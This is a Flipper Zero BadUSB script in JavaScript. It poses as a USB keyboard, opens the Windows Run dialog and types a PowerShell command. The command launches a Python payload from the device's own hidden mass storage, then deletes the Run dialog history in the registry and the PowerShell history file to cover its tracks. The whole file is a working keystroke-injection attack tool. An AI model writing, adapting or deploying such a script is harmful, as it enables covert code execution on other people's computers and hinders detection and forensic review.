// Stored variable for the python.exe that includes a space after for easy argument syntax
let python_bin = "python.exe ";
// Set arguments such as running a .py script from a folder called Payloads on the root of the Flippers Storage
let python_args = "..\\Payloads\\example.py"; // double backslashes to escape properly
// change python_dir to the name of your python directory inside the flippers storage
let python_dir = "\\Python"; // double backslashes to escape properly
let image = "/ext/apps_data/mass_storage/Python.img";

let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

print("Checking for Image...");
if (storage.exists(image)) {
    print ("Storage Exists.");
} else {
    print ("Please create the Python.img and place the Python folder in that storage...");
    exit;
}

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "r"); //Open Run Dialog
delay(300);
badusb.println("powershell");
badusb.press("ENTER");
delay(3000);
print("Running payload");
badusb.println("echo 'Please wait until this Window closes to eject the disk!';Start-Sleep 6;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':' + '" + python_dir + "';$PythonPath = $drivePath + '\\' + '" + python_bin + "';cd $drivePath; . $PythonPath " + python_args + ";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue");
badusb.press("ENTER");
badusb.quit();
delay(2000);
print("Please wait until python window closes...");

// Open Mass Storage 
usbdisk.start(image);//Open MassStorage Folder

while (!usbdisk.wasEjected()) {
    delay(1000);
}
usbdisk.stop();
print("Done");
